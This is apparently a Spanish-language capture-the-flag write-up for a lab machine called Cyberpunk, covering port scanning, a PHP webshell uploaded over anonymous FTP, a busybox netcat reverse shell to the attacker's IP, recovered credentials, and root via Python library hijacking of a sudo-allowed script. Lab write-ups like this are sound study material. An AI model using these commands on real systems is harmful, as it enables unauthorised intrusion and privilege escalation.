# 🎯 Cyberpunk CTF Writeup — The Hackers Labs

[![Security Level](https://shields.io)]()
[![Platform](https://shields.io)]()
[![Target OS](https://shields.io)]()

Repositorio de documentación técnica detallada sobre la intrusión, compromiso y escalada de privilegios en la máquina objetivo **Cyberpunk** (`192.168.0.8`). Este análisis simula una auditoría de seguridad de tipo *Black Box*.

---

## 💻 Resumen Ejecutivo

* **IP Objetivo:** `192.168.0.8`
* **IP Atacante:** `192.168.0.5`
* **Vectores de Ataque:** Anon FTP Arbitrary File Upload -> RCE (Remote Code Execution) -> Movimiento Lateral mediante Ingeniería Inversa (Brainfuck Decryption) -> Escalada de Privilegios mediante Secuestro de Librerías en Script de Python (`Sudoers Override`).
* **Objetivos Conseguidos:** `User Flag` y `Root Flag`.

---

## 🔍 Fase 1: Reconocimiento y Escaneo (Enumeration)

### 1. Descubrimiento de Puertos Activos
Se ejecuta un escaneo rápido mediante `nmap` para identificar los puertos TCP expuestos en el host objetivo, optimizando la tasa de paquetes por segundo.

```bash
nmap -p- --open -sS --min-rate 5000 -T4 -vvv -n -Pn -oG allPorts 192.168.0.8
```

**Evidencia de puertos abiertos (`allPorts`):**
```text
Host: 192.168.0.8 ()    Status: Up
Host: 192.168.0.8 ()    Ports: 21/open/tcp//ftp///, 22/open/tcp//ssh///, 80/open/tcp//http///   Ignored State: closed (65532)
```

### 2. Escaneo Detallado de Servicios y Versiones
Con los puertos identificados (`21`, `22`, `80`), se lanzan los scripts de reconocimiento por defecto de `nmap` para determinar las versiones y configuraciones de los servicios.

```bash
/usr/lib/nmap/nmap -n -Pn -sCV -p 21,22,80 --version-intensity 5 -oN targeted 192.168.0.8
```

**Resultado del escaneo avanzado (`targeted`):**
```text
PORT   STATE SERVICE VERSION
21/tcp open  ftp
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxr-xr-x   2 0        0            4096 May  1  2024 images
| -rw-r--r--   1 0        0             713 May  1  2024 index.html
|_-rw-r--r--   1 0        0             923 May  1  2024 secret.txt
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.59 ((Debian))
|_http-title: Arasaka
MAC Address: 08:00:27:6A:C1:CA (Oracle VirtualBox virtual NIC)
Service Info: Host: Servidor; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**Hallazgos Clave:**
* **FTP (Puerto 21):** Permite autenticación anónima (`Anonymous FTP login allowed`). Comparte la raíz con el servidor web (se observa `index.html`).
* **HTTP (Puerto 80):** Servidor Apache sirviendo una aplicación web titulada "Arasaka".

---

## ⚡ Fase 2: Ganando Acceso Inicial (Weaponization & Exploitation)

### 1. Intrusión mediante FTP Anónimo
Aprovechando que la raíz del servidor FTP coincide con el directorio raíz del servidor web de Apache, se procede a crear localmente un vector de ataque (WebShell en PHP) para subirlo remotamente de forma anónima.

```bash
nano webshell.php
```
*(Contenido del script para ejecución de comandos dinámicos a través de parámetros en la URL)*

Establecemos conexión con el servicio ProFTPD e inyectamos nuestro payload en el servidor:

```bash
ftp -a 192.168.0.8
```

```text
Connected to 192.168.0.8.
220 Servidor ProFTPD (Cyberpunk) [::ffff:192.168.0.8]
331 Conexión anónima ok, envía tu dirección de email como contraseña
230 Aceptado acceso anónimo, aplicadas restricciones
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> put revershell.php
local: revershell.php remote: revershell.php
229 Entering Extended Passive Mode (|||51648|)
150 Abriendo conexión de datos en modo BINARY para revershell.php
226 Transferencia completada
28 bytes sent in 00:00 (25.43 KiB/s)
ftp> exit
```

Verificamos la correcta persistencia y los permisos del archivo subido en el servidor:

```text
ftp> ls
150 Abriendo conexión de datos en modo ASCII para file list
drwxr-xr-x   2 0        0            4096 May  1  2024 images
-rw-r--r--   1 0        0             713 May  1  2024 index.html
-rw-r--r--   1 ftp      nogroup        28 Jul 14 21:51 revershell.php
-rw-r--r--   1 0        0             923 May  1  2024 secret.txt
```

### 2. Ejecución de Comandos Remotos (RCE) y Reverse Shell
Validamos la ejecución remota de comandos consultando el identificador del usuario del servicio web en el navegador:

```http
http://192.168.0.8/revershell.php?cmd=system("id");
```
**Respuesta:** `uid=33(www-data) gid=33(www-data) groups=33(www-data)`

Procedemos a entablar la conexión reversa hacia nuestra máquina de escucha (`192.168.0.5`) inyectando un payload de `busybox netcat`:

```http
http://192.168.0.8/revershell.php?cmd=system("busybox nc 192.168.0.5 443 -e sh");
```

### 3. Tratamiento y Estabilización de la TTY
Una vez recibida la shell como el usuario `www-data`, realizamos el tratamiento completo de la TTY para obtener una terminal interactiva y estable (evitando rupturas con `Ctrl+C`). 

*(Siguiendo los estándares del manual de estabilización de [Tratamiento y Estabilización de TTY](https://github.com/kaleth4/Tratamiento-y-Estabilizaci-n-de-TTY)).*

---

## 🔄 Fase 3: Movimiento Lateral (Pivoting & Escalada de Usuario)

Inspeccionando el sistema de archivos del sistema, localizamos información anómala dentro del directorio `/opt`:

```bash
arasaka@Cyberpunk:/opt$ ls -la
```
Se descubre una cadena de texto codificada en lenguaje esotérico **Brainfuck** consistente en múltiples caracteres `++++++++++`. 

Utilizando un descodificador e intérprete de Brainfuck (como [copy.sh/brainfuck](https://copy.sh/brainfuck/)), se realiza ingeniería inversa sobre la cadena, revelando las credenciales explícitas del usuario local:
* **Usuario:** `arasaka`
* **Contraseña:** `cyberpunk2077`

Se efectúa la migración de identidad dentro de la terminal:

```bash
arasaka@Cyberpunk:/opt$ su arasaka
Contraseña: cyberpunk2077
```

### Captura de User Flag
Navegamos al directorio *Home* del usuario comprometido para extraer la primera flag del CTF:

```bash
arasaka@Cyberpunk:/opt$ cd /home/arasaka
arasaka@Cyberpunk:~$ ls
randombase64.py  user.txt
arasaka@Cyberpunk:~$ cat user.txt
```

---

## 👑 Fase 4: Escalada de Privilegios (Privilege Escalation a Root)

### 1. Auditoría de Permisos Sudoers
Inspeccionamos los privilegios del usuario actual en la configuración de `sudo`:

```bash
arasaka@Cyberpunk:~$ sudo -l
```

**Resultado del comando:**
```text
Matching Defaults entries for arasaka on Cyberpunk:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User arasaka may run the following commands on Cyberpunk:
    (root) PASSWD: /usr/bin/python3.11 /home/arasaka/randombase64.py
```

El usuario `arasaka` puede ejecutar como `root` un script específico de Python ubicado en su propio Home: `/home/arasaka/randombase64.py`.

### 2. Análisis del Script Vulnerable
Revisamos el código fuente de dicho script:

```bash
arasaka@Cyberpunk:~$ cat /home/arasaka/randombase64.py
```

```python
import base64
message = input("Enter your string")
message_bytes = message.encode("ascii")
base64_bytes = base64.b64encode(message_bytes)
base64_message = base64_bytes.decode("ascii")

print(base64_message)
```

**Vector de Explotación:** El script importa la librería estándar `base64`. Debido a que tenemos permisos de escritura o capacidad de alterar las rutas de búsqueda de Python en el directorio de ejecución actual, podemos realizar un **Python Library Hijacking** (Secuestro de Librerías). Al crear un archivo con el nombre `base64.py` en el mismo directorio, el script lo importará de manera prioritaria ejecutando código malicioso bajo el contexto del usuario root.

### 3. Ejecución del Exploit e Inyección de Shell
Creamos la librería falsa `base64.py` que invocará una shell interactiva del sistema (`/bin/sh`) o `/bin/bash` cuando el script intente ejecutarla:

```bash
echo 'import os; os.system("/bin/sh")' > base64.py
```

Ejecutamos el script aprovechando el privilegio `sudo` permitido para spawnear la shell con máximos privilegios:

```bash
sudo -u root /usr/bin/python3.11 /home/arasaka/randombase64.py
```

**Evidencia de Compromiso Total:**
```text
# whoami
root
```

---

## 🏆 Fase 5: Post-Explotación & Flags

Una vez lograda la shell como `root`, nos movemos al directorio administrativo para recolectar la última muestra de compromiso del sistema.

```bash
# cd /root
# ls
root.txt
# cat root.txt
```

¡Sistema **Cyberpunk** completamente comprometido de manera exitosa! 🚀
